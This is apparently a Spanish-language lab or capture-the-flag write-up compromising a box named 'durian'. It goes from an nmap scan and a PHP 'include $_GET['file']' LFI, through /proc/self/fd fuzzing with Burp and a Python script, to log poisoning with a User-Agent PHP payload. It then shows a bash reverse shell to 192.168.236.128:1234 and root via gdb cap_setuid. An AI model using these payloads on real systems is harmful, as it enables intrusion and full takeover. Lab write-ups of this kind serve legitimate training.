PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
7080/tcp open  empowerid
8088/tcp open  radan-http

-Hacemos Fuzzing al puerto 80 y encontramos la ruta /blog, que nos dirige a un **Wordpress**

-También encontramos la ruta /cgi-data , que tiene la URL con la siguiente estructura:
	-http://192.168.236.130/cgi-data/getImage.php

-Revisamos el código fuente y encontramos esto:
	-</?php include $_GET['file'];
	(Sabemos que se está usando el parámetro 'file' para incluir archivos)

-Encontramos un 'Path Traversal':
	-http://192.168.236.130/cgi-data/getImage.php?file=/etc/passwd

-Tenemos que **derivar el LFi a RCE**

## LFI to RCE

-Probamos a listar los **logs de Apache** los **logs de SSH** , **SIN EXITO**

-Vamos a hacer un ataque de Fuerza Bruta (Pequeño) con BurpSuite, para enumerar la ruta --> **/proc/self/fd/x** . Vamos a sustituir la x por diferentes números, que son rutas del sistema dónde se pueden alojar archivos de logs.

**-Ataque Fuerza Bruta BurpSuite:**
	1-Interceptamos la petición en:
		-http://192.168.236.131/cgi-data/getImage.php?file=/proc/self/fd/0
	2-Enviamos la petición al Intruder (CONTROL + i)
	3-Seleccionamos el '1' y le damos a 'add' --> En la parte derecha (Sección Payloads): Payload type= Number --> From 1 to 20 (Probamos rutas 1-20 por ejemplo)
	-NOTA: Hay que empezar siempre desde **'1'**
	4-Pulsamos en **'Start Attack'**:
		-Las rutas que salgan con **'Length' disntintas** a las demás son las que tienen contenido y pueden ser archivos de logs.

-Fuerza Bruta con Script de Python3:
	#!/usr/bin/python3

	from pwn import *
	import requests, signal, time, sys
	
	def def_handler(sig, frame):
	    print("[!] Saliendo...\n")
	    sys.exit(1)
	
	#Ctrl + C
	signal.signal(signal.SIGINT, def_handler)
	
	#Variables Globales
	main_url = "http://192.168.236.132/cgi-data/getImage.php?file="
	
	def makeRequest():
	
	    # /proc/self/fd/x
	
	    for i in range(1, 30):
	        url = main_url + "/proc/self/fd/" + str(i)
	        r = requests.get(url)
	        
	        print("-------------------------------------------------------------------------------------------------------------------------------")
	        print("PATH: /proc/self/fd/%s" % str(i))
	        print("Response Length: %s" % len(r.content))
	        print(r.content)
	        print("-------------------------------------------------------------------------------------------------------------------------------")


	if __name__ == '__main__':
	
	    makeRequest()

-En este caso salen las siguientes valores con 'Lenght' distintas a las demás:
	-6 y 8

-Probamos a hacer peticiones a las siguientes rutas y efectivamente salen archivos de logs:
	-GET /cgi-data/getImage.php?file=/proc/self/fd/6
		-Salen unos logs un poco raros
	-GET /cgi-data/getImage.php?file=/proc/self/fd/8
		-Aquí salen los logs que se ven normalmente en --> /var/log/Apache2/access.log
		(ES AQUI!!)

-Probamos a ejecutar un comando directamente:
	-GET /cgi-data/getImage.php?file=/proc/self/fd/8
	-User-Agent: <?php system('id');?>
		uid=33(www-data) gid=33(www-data) groups=33(www-data)

-Subimos una webshell:
	-GET /cgi-data/getImage.php?file=/proc/self/fd/8
	-User-Agent: ![[Pasted image 20250422123726.png]]

-Nos mandamos un RS desde la URL:
	-192.168.236.131/cgi-data/getImage.php?file=/proc/self/fd/8&cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.236.128/1234 0>%261'
		www-data@durian:/var/www/html/cgi-data$ whoami
		www-data

## Escalada de Privilegios

-Buscamos capabilities en el sistema:
	-getcap -r / 2>/dev/null
		/usr/bin/gdb = cap_setuid+ep

-Buscamos 'gdb' en Gtfobins y pegamos el codigo de la sección 'Capabilities':
	-/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
		# whoami
		root
